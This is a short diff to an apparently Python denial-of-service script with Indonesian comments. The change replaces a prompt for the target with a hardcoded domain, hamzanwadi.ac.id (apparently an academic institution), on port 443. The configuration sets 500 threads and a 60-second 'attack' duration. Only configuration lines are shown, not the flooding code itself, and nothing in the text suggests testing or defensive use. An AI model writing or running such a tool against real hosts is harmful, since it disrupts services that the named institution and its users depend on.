@@ -4,8 +4,8 @@ import threading
 import random
 
 # Configuration
-target = input("Masukkan domain atau IP target: ")
-port = 80  # Port target
+target = "hamzanwadi.ac.id"
+port = 443  # Port target
 threads = 500  # Jumlah thread
 attack_time = 60  # Durasi serangan dalam detik
 
